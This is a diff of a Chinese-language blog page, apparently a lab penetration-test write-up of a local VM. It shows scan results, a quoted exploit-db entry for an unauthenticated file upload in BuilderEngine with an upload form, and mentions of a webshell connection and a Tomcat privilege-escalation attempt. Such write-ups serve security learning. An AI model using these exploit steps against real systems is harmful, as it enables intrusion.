@@ -364,9 +364,9 @@
 <h2 id="Nmap">Nmap</h2>
 <p><img src="/p/2d97d5ef/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"></p>
 <h3 id="开放端口：">开放端口：</h3>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22 53 80 110 111 139 143 445 993 995 8080</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span> <span class="number">53</span> <span class="number">80</span> <span class="number">110</span> <span class="number">111</span> <span class="number">139</span> <span class="number">143</span> <span class="number">445</span> <span class="number">993</span> <span class="number">995</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure>
 <h3 id="开放服务：">开放服务：</h3>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 6.6.1p1  </span><br><span class="line">ISC BIND 9.9.5-3</span><br><span class="line">Apache httpd 2.4.7 Dovecot pop3d</span><br><span class="line">Samba smbd 3.X - 4.X ssl/imaps?</span><br><span class="line">Apache Tomcat7/Coyote JSP engine 1.1</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH <span class="number">6.6</span><span class="number">.1</span>p1  </span><br><span class="line">ISC BIND <span class="number">9.9</span><span class="number">.5</span><span class="number">-3</span></span><br><span class="line">Apache httpd <span class="number">2.4</span><span class="number">.7</span> Dovecot pop3d</span><br><span class="line">Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X ssl/imaps?</span><br><span class="line">Apache Tomcat7/Coyote JSP engine <span class="number">1.1</span></span><br></pre></td></tr></table></figure>
 <h3 id="暴力目录探测">暴力目录探测</h3>
 <table>
 <thead>
@@ -520,7 +520,7 @@
 </table>
 <h1>漏洞发现</h1>
 <p>根据nmap扫描出来的端口和服务看了看貌似没啥能利用的漏洞，看一下dirb都爬到了什么信息，全部看完，发现没什么思路，又仔细看了第二遍，发现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.134/license.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.88.134/license.txt</span></span><br></pre></td></tr></table></figure>
 <p>这个地方<br>
 <img src="/p/2d97d5ef/w2.png" alt="2|690x316"><br>
 看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，</p>
@@ -530,7 +530,7 @@
 <h2 id="初步利用">初步利用</h2>
 <p>谷歌告诉我们这个的确存在漏洞，漏洞大概在BuilderEngine任意文件上传，<br>
 查看exploit-db，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted File Upload:</span><br><span class="line">	POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/</span><br><span class="line">	Vulnerable Parameter: files[]</span><br><span class="line">	We can upload test.php and reach the file via the following link:</span><br><span class="line">	/files/test.php--&gt;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">	&lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted <span class="keyword">File</span> Upload:</span><br><span class="line">	<span class="keyword">POST</span> /themes/dashboard/assets/plugins/jquery-<span class="keyword">file</span>-upload/server/php/</span><br><span class="line">	Vulnerable Parameter: files[]</span><br><span class="line">	We can upload <span class="keyword">test</span>.php and reach the <span class="keyword">file</span> via the following link:</span><br><span class="line">	/files/<span class="keyword">test</span>.php--&gt;&lt;html&gt;&lt;body&gt;&lt;<span class="keyword">form</span> method=<span class="string">"post"</span> action=<span class="string">"http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">	&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"file"</span> name=<span class="string">"files[]"</span> /&gt;</span><br><span class="line">	&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"send"</span> /&gt;&lt;/<span class="keyword">form</span>&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 <p>告诉我们，要我们把下面的代码以post方式传上去<br>
 <img src="/p/2d97d5ef/w4.png" alt="4|690x386"></p>
 <p>用蚁剑连接shell<br>
@@ -716,7 +716,7 @@ Apachetomcat7，有一个cve-2016-1240本地提权的，exp传上去发现明明
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -728,8 +728,8 @@ Apachetomcat7，有一个cve-2016-1240本地提权的，exp传上去发现明明
               
               
               <div class="site-state-item site-state-tags">
-                <a href="/tag/index.html">
-                  <span class="site-state-item-count">56</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">57</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
